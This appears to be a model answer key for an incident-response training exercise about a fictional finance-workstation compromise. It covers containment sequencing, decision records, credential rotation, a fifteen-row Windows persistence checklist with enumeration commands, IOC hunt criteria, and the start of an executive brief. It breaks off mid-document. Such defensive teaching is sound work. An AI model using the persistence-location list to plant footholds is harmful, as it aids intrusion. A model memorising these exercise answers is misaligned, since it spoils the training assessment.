**1. Why sentence 7 is the most dangerous.**
Because it is a false statement about a response action, in a document that insurers, auditors, and regulators read specifically for the response-action chronology. A wrong forensic sentence is a finding that gets corrected in the next version. A wrong statement that a host was cleaned and returned to service is a compliance and coverage problem. It implies a remediation that did not occur, on a date others will rely on. If the host later turns out to still carry the WMI subscription, the sentence is not an error but a contradiction in the record.

**2. Which question does it fail most severely.**
The single-source one. Quote: "likely exfiltrated a significant amount of sensitive payroll data." The entire claim rests on one figure from one column of one file, read in the wrong direction. The plural framing of "their command-and-control server" and "significant amount" presents it as a body of evidence.

**3. The message to the author.**
> The exfil line has the direction inverted — 2,415,891 is the `BytesReceived` column, so that traffic came in. Outbound to the C2 was 184,221. Can we pull Finding 4 out of the draft before the 18:00 brief and I'll rewrite it with you after?

---

## Task 7 — Rank Containment Options by Evidence Cost

### Part A — Ranking

| Host | 1st | 2nd | 3rd | Ruled out immediately |
|---|---|---|---|---|
| WKSTN-221 | EDR host isolation | VLAN quarantine | Physical disconnect | **Hard power-off and graceful shutdown.** Nothing is being destroyed on this host, and both cost all memory. Graceful shutdown also fires shutdown handlers. This host carries an attacker-authored, logon-triggered task, so a shutdown/restart cycle is precisely the event that would give the dormant persistence its first opportunity to run. |
| FILESVR-03 | Hypervisor suspend + snapshot | VLAN quarantine | Perimeter block (as a stopgap while the snapshot is arranged) | **EDR host isolation** — not available, no agent. **Account disable as a substitute** — it does not contain the host and leaves any non-`payroll-admin` access untouched. |
| 10.0.4.17 | Perimeter / DNS block of the C2, plus monitoring, while the host is located | Switchport ACL or shut once the port is identified | Physical disconnect once someone is standing at it | **EDR isolation** (not managed, no agent), **hypervisor snapshot** (not a known VM), and **account disable** as a containment measure for this host (it is not the control path). You cannot contain a host you cannot find. Step one is finding it. |

### Part B — Evidence cost of the first choice

| Host | Option | Preserves | Destroys or costs | Acceptable? |
|---|---|---|---|---|
| WKSTN-221 | EDR host isolation | Memory, running processes, disk, all volatile state; host keeps running. Persistence artifacts intact for collection. | Live network connections drop — any in-flight session state to 91.214.47.22 or 10.0.4.17 is lost. The attacker learns the host is contained. Onward collection is throttled to the EDR channel's bandwidth. | Yes, with one condition: capture memory first. There is no memory image of this host and isolation does not create one, so isolating without capturing bakes in the gap permanently. Attacker on-host activity ended at 14:38 and nothing has been observed since, so the live-session loss is close to nil in practice. |
| FILESVR-03 | Hypervisor suspend + snapshot | A complete memory image **and** disk state, atomically. This is the best-case containment and it costs essentially nothing evidentially. | Nothing evidential. The cost is entirely operational: 40 users lose the share for the duration of the snapshot. | Yes. This is the single highest-value action available across all three hosts. It contains the host and captures its memory in one action, on the one host with no EDR agent and no other capture path. |
| 10.0.4.17 | C2 block + monitor while locating | Everything on the host, including live attacker behaviour, which is the only telemetry you have for a host you cannot otherwise see | Accepts ongoing attacker action on an unknown host for as long as it takes to find it. The attacker may notice the C2 block and switch infrastructure. | Conditionally. It is acceptable only because you have the authority and the flow telemetry to watch, and only with a hard time limit. If the host is not located by a stated hour, escalate to segment-level containment of the finance VLAN and accept the business impact. Write the time limit down. |

### Part C — Sequence from 17:30 UTC

| # | Time | Action | Host | Why here |
|---|---|---|---|---|
| 1 | 17:30 | Write the containment decision records. Note the clock, the authorizer, the options chosen, the costs accepted. | All | §13.4.2 step 1. It is what a reviewer reads first, and it takes 90 seconds now versus never later. |
| 2 | 17:32 | Block 91.214.47.22 at the perimeter and sinkhole any resolution for it. | All | Severs the command channel across every host at once, including the one you cannot find, at zero evidence cost to any host. Do it before anything visible happens on an endpoint. |
| 3 | 17:35 | Begin memory capture on WKSTN-221. Record tool, version, output path, SHA-256. | WKSTN-221 | The one irreversible gap you can still close. Roughly 20–35 min for 16 GB. Everything else on this host waits for it. |
| 4 | 17:35 | In parallel: switch-port and MAC tracing for 10.0.4.17 from the DHCP lease. | 10.0.4.17 | Independent team, no dependency on the WKSTN-221 work. Hard deadline: 19:30. |
| 5 | 17:45 | Arrange the FILESVR-03 snapshot window with the file-server owner; take the hypervisor snapshot as soon as approved. | FILESVR-03 | Needs an approval that takes time to obtain, so start the conversation early. The action itself costs no evidence, so there is no reason to delay it once approved. |
| 6 | ~18:10 | Capture volatile network and process state on WKSTN-221 — connections, process tree, sessions, handles, scheduled tasks, WMI subscriptions. | WKSTN-221 | §13.4.2 step 3. Minutes, not hours. |
| 7 | ~18:20 | Apply EDR isolation to WKSTN-221. | WKSTN-221 | Only now, once memory and volatile state are in hand. |
| 8 | ~18:25 | Disable `payroll-admin`; begin the rotation sequence at item 1 of §13.5.4. | Domain | After host containment, not before — see Q2. Then persistent artifact collection at whatever pace the case needs. Disk is patient. |

Note what this sequence does *not* do: it does not contain WKSTN-221 first because it is the host you understand best. Containing the understood host while the unknown one stays live is the piecemeal pattern §13.4.5 warns about. It gives the attacker a warning, and time to adapt, before you have reached the host you cannot see.

**1. The near-zero-cost option.**
FILESVR-03, hypervisor suspend and snapshot. Responders forget it because their reflex is the EDR console. When a host has no EDR agent, the reflex fails, and the next thought is usually "then we can't contain it remotely" rather than "then use the hypervisor." On this incident it is doubly valuable: FILESVR-03 is the only host in the case where you can still obtain a memory image without a separate capture step.

**2. Two costs of disabling `payroll-admin` at 17:35.**
First, it kills sessions unpredictably. The 4634 at 14:38 closed the 10.0.4.17 session, but any process running under that user's token on WKSTN-221 may terminate, and you have not captured memory yet. You would permanently lose the process memory of anything the attacker left resident. Second, it is loud, and it is loud in the wrong order. Disabling the account before the C2 block and before you have located 10.0.4.17 tells the attacker they are detected while they still have an uncontained host and a working command channel. §13.4.5 describes that scenario as inviting accelerated exfiltration or an early destructive payload.

**3. Locating 10.0.4.17.**
(a) Pull the current and historical DHCP lease for 10.0.4.17 to get the MAC address and the lease timestamps, which also tell you when the host first appeared on the network. (b) Query the switch MAC address tables, or the NAC/802.1X logs if present, for that MAC to get the switch and physical port. (c) Have someone walk the port to the wall jack and the desk. In parallel, query the DC for computer accounts whose `lastLogonTimestamp` matches the 14:31:05 window. A domain-joined host has an account even if the CMDB never knew about it, and that account is what resolved it in this case.

**4. The fact that changes everything at 17:45.**
Any indication of active destruction: file-share encryption starting on FILESVR-03, mass file renames appearing in the flow or EDR telemetry, a new EID 1102 (log cleared) on any host, or shadow-copy deletion. Any of those overrides the whole sequence: cut the network immediately and document what was lost. The same applies to a *second* live C2 session appearing after the 17:32 perimeter block, because it means the attacker has infrastructure you have not identified and is still operating.

---

## Task 8 — Write the Containment Decision Record

**WKSTN-221:**

> `2024-11-14 18:20 UTC — EDR host isolation applied to WKSTN-221 (10.0.4.32). Authorized by J. Okafor (IR Manager), verbally on the incident bridge at 18:18, confirmed by email at 18:31 (ref IR-AUTH-014-02). Supersedes the 14:25 decision to monitor and collect before isolating. Memory captured at 17:35–18:04 UTC (WinPmem 4.0.rc2, output \cases\IR-2024-11-014\WKSTN-221\memory\wkstn221-mem.raw, SHA-256 recorded in CoC-014-003); volatile network, process, session, scheduled-task and WMI-subscription state captured 18:10–18:18 (CoC-014-004). Isolation chosen over VLAN quarantine because network team escalation would have added approximately 40 minutes and the EDR agent is healthy; chosen over physical disconnect because remote collection of persistent artifacts is still required. Evidence cost accepted: live network session state to 91.214.47.22 and 10.0.4.17 is lost (both sessions had already closed by 14:38, so the practical loss is nil); the attacker learns this host is contained; further collection is throttled to the EDR channel. Trigger for reassessment: if the update.exe hash (SHA-256 4f8b2c1a…12345) or 91.214.47.22 appears on any additional host, re-evaluate whether finance-VLAN or estate-wide containment is required. — A. Reyes`

**FILESVR-03:**

> `2024-11-14 18:05 UTC — Hypervisor suspend and snapshot taken of FILESVR-03 (10.0.4.18) on cluster VMW-FIN-02. Authorized by J. Okafor (IR Manager) at 17:52; business impact approved by M. Duarte (Finance Systems Owner) at 18:01 for a 30-minute window. Snapshot includes memory and disk state atomically (vmsn + vmem, retained on the isolation datastore, hashes in CoC-014-005). Snapshot chosen over VLAN quarantine because it costs no evidence at all and simultaneously captures memory on a host with no other capture path; chosen over EDR isolation because no EDR agent is deployed to servers. Evidence cost accepted: none evidential. Operational cost accepted: Finance$ share unavailable to approximately 40 users for the snapshot window; Finance Systems Owner notified and users messaged at 17:58. VM resumed 18:19 into an isolated port group with the analyst collection path permitted. Trigger for reassessment: if EID 4624 type 3 for payroll-admin from 10.0.4.32 is confirmed in the 14:33–14:35 window, or any file-read auditing shows Finance$ content accessed, escalate to full imaging and treat the host as compromised rather than contacted. — A. Reyes`

**1. How long did it take?**
Once you have the habit, 90 seconds for the WKSTN-221 record is realistic. The field that slows everyone down the first time is "reason for this option over the next one down the list," because it forces you to articulate a choice you made reflexively. That difficulty is the point. A reason you cannot write down in one clause is usually not a reason but a habit.

**2. If the authorizer denies it.**
The verbal authorization at 18:18 is worth much less than the email at 18:31, which is why the record names both and cites the reference. If you have only a verbal authorization, the record still helps. A contemporaneous note naming the person, the time, and the channel is evidence, and it is far better than a reconstruction. The discipline, though, is to convert verbal to written within the hour and to reference the artifact. The record protects you by being contemporaneous, specific, and *unfavourable in places*: a note that also records what you gave up and what you were unsure of does not read as self-serving.

**3. Where the business owner's objection belongs.**
Not in the reason, and not in the evidence cost. It belongs in a **business impact accepted** field of its own, with the name of the person who accepted it and the time they accepted it. Folding it into the reason, as in "we chose snapshot because the owner objected to quarantine," corrupts the forensic rationale with an operational one and makes the record harder to defend. Keeping them separate lets a reviewer see that you made the evidence decision on evidence grounds and then handled the business consequence as a distinct, owned decision.

---

## Task 9 — Rebuild or Clean

| Factor | WKSTN-221 | FILESVR-03 | 10.0.4.17 | HR-WS17 |
|---|---|---|---|---|
| Attacker access level | User context (`payroll-admin`); no 4672 privilege assignment beyond the routine logon set; no evidence of SYSTEM | None established — contacted, not confirmed compromised | Unknown. Assume administrator until shown otherwise | N/A — no intrusion |
| Tooling observed | One unidentified binary (`update.exe`), deleted, never analysed; one download cradle | None | Unknown | `7zG.exe`, `OneDrive.exe`, `msedge.exe` — all legitimate |
| Persistence found | Two mechanisms, both understood, neither executed | None found | Unknown | None |
| Kernel-level activity | None observed in the intrusion window. Note the `npcap` kernel-mode driver installed at 02:14:18 (System EID 7045), 12 hours before the intrusion and immediately after boot. It is not attributable to the intrusion, but confirm it against the build standard before asserting "no kernel activity" | None | Unknown | None |
| Dwell time | Hours on the face of it — but the 04:00 authentication attempts and 36-hour log retention make it **Undetermined** | Minutes of contact | Unknown, and it has been domain-joined and unmanaged for 18 months | N/A |
| Host role | Low-value, reimageable workstation with a golden image | File server holding finance data; not a DC, CA, or backup server | Unknown; unmanaged; on the finance VLAN | Evidence item |
| Rebuild cost | Low | Moderate — share data restores from backup, but requires a maintenance window | Low. Nobody depends on it | N/A |
| Confidence in scope | **Probable** at best. `10.0.4.17` unresolved at the time of the decision | Probable, pending destination-side log review | None | Confirmed |
| **Decision** | **Rebuild** | **Clean and monitor**, pending destination-side confirmation | **Rebuild — or better, retire** | **Neither — preserve** |
| **Justification** | Scope confidence is below Confirmed and the binary was never recovered, so "we found everything" is an assessment against tooling we never saw. A golden image exists and rebuild cost is a working day for one user. | No evidence of compromise was found on this host; it was contacted, not owned. Rebuilding a file server on the basis of an inbound authentication would be disproportionate. The decision is contingent: any confirmed successful logon plus file access moves it to rebuild. | The host is unmanaged, uninventoried, unpatched for an unknown period, and has no owner or documented function. There is no configuration worth preserving and no argument for cleaning something nobody can describe. Removing it from the network permanently is preferable to rebuilding it. | The host is a preserved image in an evidence locker under a litigation hold. It is not returned to service at all. It is retained per the hold and hashed, and counsel sets its disposal date. |

**On HR-WS17.** The rebuild-or-clean question does not apply, and recognizing that is the point of including it. A host preserved as evidence has a different lifecycle: it is not remediated, it is *retained*. What the eight factors do tell you is that the departing employee's *account* and its cloud tokens need action, not the hardware. That is a §13.5.4 item 7 problem: personal-account linkage, corporate OAuth grants, mobile device enrolments. Responders routinely miss it because the host looks like the artifact.

**1. Did anything justify cleaning?**
FILESVR-03, and it needs the justification written properly:

> FILESVR-03 was retained rather than rebuilt. The host was contacted by a compromised workstation at 14:33:18 UTC on 2024-11-14 via an explicit-credential SMB connection to the `Finance$` share. Destination-side Security logs for the window were reviewed and record the connection and directory enumeration. The review identified no file-content reads beyond directory listings, no process creation attributable to the connecting session, no service or scheduled-task creation, and no attacker binary (Finding 9). Full persistence enumeration was performed per the 15-location persistence checklist in Section 6.1 (Eradication verification) and returned clean. The hypervisor snapshot taken at 18:05 preserves a complete memory and disk image should any of this need revisiting. The host was retained because the evidence establishes contact rather than compromise. A positive, documented review of the destination host displaced the rebuild default, not the absence of a reason to rebuild.

That last sentence is the one that matters. Cleaning is defensible when you can point at what you checked. It is not defensible when the argument is "we found no reason to rebuild."

**2. What eighteen months of being unmanaged moves.**
It moves three factors hard. **Dwell time** — you have no basis for any figure at all on that host, and §13.5.3 says "days or weeks, assume you have not found everything." An unmonitored existence of 18 months is worse than a long dwell time: it is an unbounded one. **Confidence in scope** — it drops to None. A host absent from the CMDB was also absent from every patch cycle, every EDR rollout, and every log-forwarding config, so the sources you would use to scope it do not exist. **Attacker access level** — you must assume administrator. An unpatched host that has been on the network unmanaged for 18 months has no defensible claim to have restricted anything. Any one of those three alone forces rebuild.

**3. If the 14:33 logon had gone to DC02.**
Everything changes. A domain controller compromised at SYSTEM level cannot be trusted after cleaning under any circumstance, so rebuild becomes mandatory rather than preferred. The conversation does not stop at the host, though. It escalates to `krbtgt` rotation twice, with the replication interval between. That rotation was arguable in the real scoping and becomes non-negotiable here. It also escalates to the assumption that every domain credential is exposed, and to a review of whether the certificate authority is affected. If the CA is in scope, every certificate it issued is suspect and you are in a forest-recovery conversation, not a host-cleanup one. Practically, the incident stops being an IR engagement scoped to three hosts and becomes a domain-recovery programme with a different governance structure. The analyst's job shifts to establishing the earliest confirmed compromise timestamp as precisely as possible, because that single number determines which backup of AD is safe.

---

## Task 10 — Credential Rotation, In Order

### Part A

| # | Category | Applies? | What specifically | Timing | Owner |
|---|---|---|---|---|---|
| 1 | Confirmed attacker use | Yes | `payroll-admin` | Simultaneous with WKSTN-221 containment (18:20–18:25 on 14 Nov), not before | IR + Identity |
| 2 | Local admin passwords | Yes | Local admin on WKSTN-221, FILESVR-03, and 10.0.4.17. LAPS is not deployed on the workstation fleet, so the shared build password is exposed — that is every host built from the same image | After containment of all three, before restore. Treat as estate-wide, not host-scoped. | Platform Engineering |
| 3 | Service accounts on compromised hosts | Yes | `svc-backup` — see Part B. Any service account configured in a service or scheduled task on the three hosts | After containment; sequence with application owners, since this is where rotation causes outages | Platform + app owners |
| 4 | Privileged domain accounts | Yes, precautionary | Domain admins, backup operators, and anything with delegated rights on the finance OU. No evidence of use, but 10.0.4.17's history makes exposure unquantifiable | After 1–3, before restore | Identity |
| 5 | `krbtgt`, twice | See Q3 | — | — | Identity |
| 6 | Bulk user population | No | No credential dumping was confirmed, no memory image from the intrusion window exists to check, and none of the three hosts is a terminal server, VDI host, or shared jump box with many concurrent sessions | — | — |
| 7 | Certificates, API keys, tokens | Yes, and this is the one that will be skipped | `payroll-admin`'s Entra ID refresh tokens (a password reset does not revoke them), any OAuth grants on that identity, cached corporate OneDrive tokens on WKSTN-221, and any certificate or key material on 10.0.4.17 | With item 1 for the token revocation; with item 2 for anything found on 10.0.4.17 | Identity + Cloud |

### Part B

**Was `svc-backup` exposed?**
The honest answer is **Possible**, and the honest reasoning is that you cannot tell. `svc-backup` authenticated to WKSTN-221 at 02:14:14 on 2024-11-14 (EID 4624, type 3, Kerberos) and its scheduled task `BackupServiceSync` ran at 02:14:14 under `FINANCE\svc-backup`. That is roughly 12 hours before the attacker's activity. A type-3 Kerberos logon does not leave reusable credential material in LSASS the way an interactive or batch logon does, which argues against exposure. But the scheduled task runs as that account, so its credential is stored in the Credential Manager vault on the host, where anything with SYSTEM can recover it. Whether the attacker reached SYSTEM is itself unestablished.

Action: **rotate it**, and say why in the report. The asymmetry is decisive. If you rotate and were wrong, the cost is a coordinated change with the backup application owner and a maintenance window. If you do not rotate and were wrong, the attacker holds a service account with backup-operator-adjacent rights across the estate. That credential can read every file it is meant to protect and, on many estates, log on to the backup infrastructure. §13.5.2 lists unrotated credentials among the five common causes of the four-day reinfection. Its specific pattern is exactly this one: the host was rebuilt and the attacker logged straight back in with the service account.

**Does the missing intrusion-window memory image make this easier or harder?**
Harder to answer, easier to decide. It is harder because the one artifact that would have settled it was never captured and cannot be created now. That artifact is LSASS process memory from the intrusion window, showing what credential material was resident, or evidence of an LSASS-access handle. The 17:35 image shows the host three hours later, not during the window. It is easier because, when the evidence cannot resolve the question, the conservative action is the only defensible one, and there is no analysis to agonize over. The report should say so plainly:

> **Finding 11 — Credential exposure on WKSTN-221: Undetermined.** No memory image of WKSTN-221 was captured before 17:35 UTC on 2024-11-14, approximately three hours after attacker activity ceased. Process memory, injected code, and credential material resident in LSASS during the intrusion window cannot now be assessed. Whether the attacker obtained credentials beyond `payroll-admin` is therefore Undetermined. All credentials present on the host in any form have been rotated on a precautionary basis: cached, vaulted in Credential Manager for the `BackupServiceSync` task, or stored in browser profiles. See Gap L-1.

**What eighteen unmanaged months does to categories 2 and 4.**
Category 2 stops being host-scoped and becomes estate-scoped. A host absent from LAPS deployment and from the CMDB was almost certainly built from a shared image with a shared local administrator password. That password is now in play everywhere that image was used. Category 4 becomes unquantifiable rather than merely uncertain. You cannot enumerate which privileged accounts ever authenticated to a host you have no logs for, so you cannot scope the rotation. When you cannot scope a rotation, you rotate the category.

**1. Rotating at 17:35 on 14 November.**
WKSTN-221 is not isolated until 18:20 and memory capture is running from 17:35. Rotating `payroll-admin` at 17:35 does three things wrong at once. It may terminate the session whose memory you are in the middle of capturing, producing a torn or invalid image. It tips the attacker off while they still have an uncontained host and an unblocked path. Most fundamentally, an attacker with code execution on a host that will see the new credential simply re-harvests it. §13.5.4's closing line is the whole argument: rotating while the attacker still holds a host that sees the new credentials accomplishes nothing but paperwork.

**2. Three forgotten category-7 items in a finance department.**
(a) The service principal or app registration behind whatever automation posts journal entries into the ERP. It authenticates with a client secret that nobody has rotated since it was created. (b) SFTP keys or stored credentials for bank and payment-file transfer, usually in a scheduled job on a finance server. (c) Personal access tokens in whatever the finance analytics team uses to pull data, such as a Power BI gateway credential, a database service account embedded in a spreadsheet connection string, or a PAT in a reporting pipeline. All three are credentials, none of them appears on an identity team's account list, and all three survive a domain-wide password reset untouched.

**3. Is `krbtgt` rotation justified as scoped on 17 November?**

*Against:* The scoped evidence does not support domain-level compromise. Attacker access is user-context on one workstation. No 4672 beyond the routine logon privilege set. No DC was touched, no DCSync-shaped activity appears in any reviewed log, and the file-server review found contact rather than compromise. `krbtgt` rotation is disruptive, it is done twice with a replication interval between, and doing it reflexively on every incident devalues it. Teams that rotate `krbtgt` for a user-context workstation compromise will hesitate to do it when it matters.

*For:* Scope confidence is Probable, not Confirmed. The host at 10.0.4.17 was domain-joined and unmanaged for 18 months. You have no authentication history, no patch history, and no telemetry for it, and it was actively involved in this intrusion. You cannot state what privileged credentials ever touched it.

*Commit:* **No `krbtgt` rotation on the evidence as it stands on 17 November — but make it conditional and write the condition down.** The trigger: any evidence of DCSync or directory replication activity, any 4624 or 4672 for a domain admin on 10.0.4.17 recovered from its image, or any Kerberos anomaly in the elevated-monitoring window. Stating the condition in the report is what distinguishes a decision from an omission. A reviewer who sees "krbtgt rotation was assessed and not performed, on this basis, with this trigger" reads a judgement. A reviewer who sees nothing about `krbtgt` reads an oversight.

---

## Task 11 — Build the Eradication Verification Checklist

### Part A

| # | Question | Answer | Confidence | Reinfection risk |
|---|---|---|---|---|
| 1 | All persistence identified? | Two mechanisms identified and removed on WKSTN-221; none found on FILESVR-03; 10.0.4.17 imaged and enumerated | **Probable** for WKSTN-221 and FILESVR-03. **Possible** overall, because the WKSTN-221 triage collection did not enumerate COM hijacks, IFEO, AppInit/AppCert, LSA/SSP providers, Office add-ins, BITS jobs, or accessibility-tool replacements | If a mechanism exists in an unenumerated location on WKSTN-221, the rebuild removes it — which is one more argument for rebuild over clean. The residual risk sits on FILESVR-03, which was retained. |
| 2 | All attacker-accessible credentials rotated? | Items 1–4 and 7 of §13.5.4 completed; item 5 conditional, item 6 not applicable | **Probable.** Rotation of items 1–4 is verifiable from the identity system. Item 7 is the weak point because nobody holds a complete inventory of tokens and keys | If a service principal or SFTP key held on any of the three hosts was not identified, the attacker retains an access path that survives every password reset. |
| 3 | Entry point closed? | **Undetermined** | Undetermined | The highest of the three. See Q3. |

### Part B — Persistence verification checklist

| # | Mechanism | How to check | Found? |
|---|---|---|---|
| 1 | Run / RunOnce | `RECmd` over SOFTWARE + NTUSER.DAT; `…\CurrentVersion\Run`, `RunOnce`, `Policies\Explorer\Run`, `WOW6432Node\…\Run` | No — enumerated, clean |
| 2 | Services | SYSTEM hive `CurrentControlSet\Services`; System EID 7045; compare against a known-good service list. Watch for unsigned or user-path `ImagePath` values | No |
| 3 | Scheduled Tasks | `C:\Windows\System32\Tasks\` XML, EID 4698. **Check the `Author` field** — a user-authored task inside a `\Microsoft\Windows\` folder is the tell | **Yes** — `WindowsUpdateSync`, author `FINANCE\payroll-admin`, created 14:22:58 |
| 4 | WMI event subscriptions | `Get-WmiObject -Namespace root\subscription -Class __EventFilter`, `__EventConsumer`, `__FilterToConsumerBinding` — **and repeat for `root\default` and any custom namespace** | **Yes** — `WindowsUpdateFilter` + `WindowsUpdateConsumer`, binding present, created 14:23:02 |
| 5 | COM hijacks | `HKCU\Software\Classes\CLSID\{…}\InprocServer32` shadowing an HKLM CLSID; compare user-hive CLSIDs against machine-hive equivalents | Not enumerated |
| 6 | IFEO debuggers | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*\Debugger` and `GlobalFlag`/`SilentProcessExit` | Not enumerated |
| 7 | AppInit / AppCert DLLs | `…\Windows NT\CurrentVersion\Windows\AppInit_DLLs` (and `LoadAppInit_DLLs`); `…\Control\Session Manager\AppCertDlls` | Not enumerated |
| 8 | Winlogon Shell / Userinit | `…\Windows NT\CurrentVersion\Winlogon` — `Shell` should be `explorer.exe`, `Userinit` should be `C:\Windows\system32\userinit.exe,`. Appended values are the attack | No — both default |
| 9 | LSA and SSP providers | `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` — `Security Packages`, `Authentication Packages`, `Notification Packages` | Not enumerated |
| 10 | Office add-ins and templates | `HKCU\Software\Microsoft\Office\<ver>\<app>\Addins`; `%APPDATA%\Microsoft\Templates\Normal.dotm`; the `XLSTART` and `STARTUP` folders | Not enumerated |
| 11 | Startup folders | `%APPDATA%\…\Start Menu\Programs\Startup\` and `C:\ProgramData\…\Startup\`; MFT for recent creations in both | Not enumerated as a distinct check |
| 12 | BITS jobs | `bitsadmin /list /allusers /verbose` or `Get-BitsTransfer -AllUsers`; `Microsoft-Windows-Bits-Client/Operational` | Not enumerated |
| 13 | Accessibility-tool replacements | Hash and signature check `sethc.exe`, `utilman.exe`, `osk.exe`, `Magnify.exe`, `DisplaySwitch.exe`, `AtBroker.exe` against known-good; also check IFEO entries for each (row 6 covers the modern variant) | Not enumerated |
| 14 | Attacker-installed RMM / remote access | Installed-programs inventory, Amcache, Prefetch, and outbound flow for known RMM destinations. **A licensed RMM agent installed by the attacker is persistence** — its legitimacy is not the question, its authorization is | Not enumerated |
| 15 | *Addition:* Netsh helper DLLs, print-processor and port-monitor DLLs, and Winsock LSPs | `…\Control\NetworkProvider\Order`; `…\Control\Print\Monitors\*\Driver`; `netsh winsock show catalog`; `HKLM\SOFTWARE\Microsoft\Netsh` | Not enumerated |

Rows 5–7 and 9–15 are why Part A question 1 is **Possible** rather than Probable. They are the specific content of Gap L-2.

### Part C — The verification pass

| Step | Concrete action | Owner | Done when |
|---|---|---|---|
| Re-hunt full IOC set | EDR retro-hunt across all managed endpoints for SHA-256 `4f8b2c1a…12345`, SHA-1 `a1b2c3d4…abcd`, the filename `update.exe` in any user `Temp\` path, scheduled tasks named `WindowsUpdateSync` or authored by a non-SYSTEM principal inside `\Microsoft\Windows\`, WMI consumers named `WindowsUpdateConsumer` or any `CommandLineEventConsumer` with an `-EncodedCommand` argument, and flow to 91.214.47.22 | Detection Engineering | Query executed across ≥95% of managed endpoints, results triaged, coverage gap (unmanaged hosts) documented by name |
| Re-check persistence on formerly-compromised hosts | Run the full Part B checklist — all fifteen rows, not the two that were found — against FILESVR-03 (retained) and against the rebuilt WKSTN-221 after 7 days of operation | IR | Checklist completed and signed with a date per host |
| Positively test the entry point | See Q3 | Email Security + IR | A positive test result, not an assertion |
| Confirm rotation completed | Identity team produces a per-item report against the Task 10 Part A list, with completion timestamps. Partial rotation is the norm, and teams usually discover it during the next incident | Identity | Every row has a timestamp or a documented exception with an owner |
| Elevated monitoring | 28 days from 17 November. Deploy both Sigma rules from Task 13 plus an alert on any connection to 91.214.47.22 and on the creation of any `CommandLineEventConsumer`. Named analyst on the triage queue daily | SOC | 28 days elapsed with a daily triage record, and a documented false-positive rate for each rule at day 14 |

**1. `root\default`.**
An analyst enumerating only `root\subscription` on this host would have missed `TimerConsumer1` — a `CommandLineEventConsumer` bound to a `__TimerEvent` filter in `root\default`, running `C:\Program Files\BackupAgent\bkupagent.exe --heartbeat`. In this case it is benign: it belongs to the backup agent and predates the intrusion by two months. That is exactly why it matters. The namespace is a real hiding place with real legitimate occupants, so an attacker who registers there gets both concealment from an incomplete sweep *and* plausible neighbours. The mistake an attacker wants you to make is to treat "check WMI persistence" as a synonym for "enumerate `root\subscription`."

**2. Persistence that never fired.**
It belongs in the **eradication checklist**, unconditionally. A scheduled task with a logon trigger has not fired because the user has not logged on since it was created. It is dormant, not defunct, and a reboot or a logon is all it takes. Treating "never ran" as "harmless" is how hosts come back four days later.

It belongs in the **IOC list** too, and the argument is different: the task name, the task path, the author field, and the encoded command line are all hunting content. They are what you sweep the estate for in the verification pass. Tag them as *creation* indicators rather than *execution* indicators. A hunt that keys on execution artifacts, such as Prefetch, 4688, and script-block logs, will not find this task anywhere, and an analyst who searches only those will wrongly conclude the estate is clean.

**3. The entry point.**
As of 17 November the entry point is **not established**, so it cannot be closed. Item 3 of §13.5.1 is therefore Undetermined, and the intrusion has been interrupted rather than eradicated. What is known: `POWERSHELL.EXE` spawned from `OUTLOOK.EXE` at 14:19:38, and an LNK for `Q4_Payroll_Review.xlsm` was created 43 seconds earlier. What is not known: whether that file arrived by email, whether it was the vehicle at all, and whether the four failed authentications from 185.193.126.47 at 04:00 the same morning were related.

One part of the 04:00 activity is already a finding, and it is a missing row. The perimeter log `Data/network/firewall-blocks.csv` denies the same scanner at three other hosts and the DNS server, but holds no deny row for WKSTN-221. `Data/network/flow-data.csv` records the 04:00 SMB session to 10.0.4.32 as established, and the host logged the four failed logons. Some path let an internet address reach this workstation's SMB port, and the data does not say which. That path needs closing whatever the entry point turns out to be.

"Closed" would mean one of three specific things, depending on what the entry point turns out to be. The first is the message and its attachment purged from every mailbox that received it, and the sender blocked, with the delivery report showing the recipient list. The second is the `payroll-admin` account brought under MFA, with conditional access blocking the source geography. The third is a patch level verified in a running configuration.

The positive test is the part that gets skipped, and it is not "we blocked the sender." Retrieve the message from the mail gateway and confirm the attachment hash matches something that was on the host. Run a purge across all mailboxes. Then produce the purge report showing zero remaining copies, and the recipient list showing who else received it. If gateway retention has passed and the message cannot be retrieved, that is itself the finding. It is a Gap L entry, not a closed entry point.

---

## Task 12 — Write the One-Page Executive Brief

### Version 1 — 2024-11-14

```markdown
# Incident Brief — Finance Workstation Compromise        Ref: IR-2024-11-014
As of: 2024-11-14 17:45 UTC | Status: Active
Prepared by: A. Reyes, Incident Response | Classification: Confidential — Internal
Distribution: CFO, CIO, General Counsel, IR Manager

## Bottom line
A finance workstation was compromised on the afternoon of 14 November. An attacker
ran a program on that machine, set up two mechanisms to get back in later, and
reached both the finance file server and a second computer inside our network that
is not on our asset list. We are containing all three now. We have not established
that payroll or customer data left the company, and we cannot yet rule it out.

## What we know
- Attacker activity on the workstation ran from about 14:19 to 14:38 on 14 November
  — a window of roughly twenty minutes.
- The attacker downloaded and ran a program on the workstation, then deleted it.
  We recovered enough evidence to identify it and search for it elsewhere.
- Two hidden mechanisms were left behind that would have restored the attacker's
  access. Neither has run. Both will be removed.
- About 4 megabytes was copied off the workstation to another computer on our own
  network. That computer is not in our asset inventory and has no assigned owner.
- Traffic also went to an address outside the company. More came in than went out:
  about 2.4 megabytes received, about 180 kilobytes sent.

## What we do not know yet
- What was accessed on the finance file server. Collection starts within the hour;
  expected answer by 22:00 today.
- What the unidentified computer on our network is, who controls it, and where the
  data went next. Network tracing is under way; expected answer by 20:00 today.
- Whether the traffic sent outside the company contained business data. It was
  encrypted and we have no recording of it. This may not be answerable at all.

## Business impact
One finance workstation, one user account, and the finance file server are in scope.
The workstation user will be without their machine from this evening. The finance
share may be unavailable for up to 30 minutes tonight depending on the containment
method. Payroll and customer pricing data are held on the file server and are
therefore in question; whether either was accessed is under assessment. No service
outage has occurred so far.

## Actions taken
| When (UTC) | Action | By |
|---|---|---|
| 14:21 | Automated alert raised on the workstation | Security platform |
| 14:23 | Escalated to Incident Response; investigation opened | Security Operations |
| 14:25 | Decided to keep the workstation online and watched while evidence was collected | IR |
| 15:10 | Evidence collection begun on the workstation | IR |
| 17:20 | File server and second computer identified as in scope | IR |
| 17:32 | External address blocked at the perimeter for all systems | Network |

## Decisions needed from leadership
1. Authorization for a 30-minute outage of the finance file share tonight — needed
   by 18:30 — because we cannot answer "was payroll data accessed" without taking
   an evidence copy of that server, and every hour it stays as-is is an hour the
   attacker could return to it.
2. Whether to engage General Counsel formally today rather than after the
   investigation — needed by 19:00 — because if customer data was accessed, external
   notification timelines run from discovery, which was today.

## Next update: 2024-11-14 21:00 UTC
```

### Version 2 — 2024-11-17

```markdown
